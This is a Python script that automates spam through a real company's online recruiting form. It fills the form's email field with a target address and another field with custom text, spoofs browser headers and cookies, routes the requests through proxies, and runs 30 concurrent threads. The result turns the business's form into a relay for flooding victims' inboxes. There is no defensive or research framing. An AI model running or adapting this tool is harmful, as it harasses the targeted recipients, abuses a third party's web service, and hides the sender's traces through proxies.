from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '_orig_referrer': 'https%3A%2F%2Fwww.google.com%2F',
            '_landing_page': '%2Fpages%2Fcareers',
            '_y': '2fd92402-5540-4541-bf14-b12698ccb71b',
            '_shopify_y': '2fd92402-5540-4541-bf14-b12698ccb71b',
            '_s': '3ddf351a-ce6b-48fe-ae47-5f35edb5dfa1',
            '_shopify_s': '3ddf351a-ce6b-48fe-ae47-5f35edb5dfa1',
            '_shopify_sa_t': '2023-02-03T15%3A45%3A14.463Z',
            '_shopify_sa_p': '',
            '_cmp_a': '%7B%22purposes%22%3A%7B%22a%22%3Afalse%2C%22p%22%3Afalse%2C%22m%22%3Afalse%2C%22t%22%3Afalse%7D%2C%22display_banner%22%3Atrue%2C%22merchant_geo%22%3A%22USUSNY%22%2C%22sale_of_data_region%22%3Afalse%7D',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'https://www.ninamclemore.com',
            'Referer': 'https://www.ninamclemore.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'fname': 'testages/careers',
            'lname': self.get_text(target=target),
            'street': 'test',
            'city': 'test',
            'state': 'AR',
            'zip': '01101',
            'phone': '123 123 1234',
            'email': target,
            'referral': 'test',
            'location': 'test',
            'desc': 'desc',
            'copy': 'on',
        }

        response = requests.post('https://ftp.ninamclemore.com/recruiting/formRecruit.php', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies(), timeout=30)
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'has been emailed to')
    res = spam.send_post()
    if res:
        spam.run_concurrently(30)


if __name__ == '__main__':
    main()
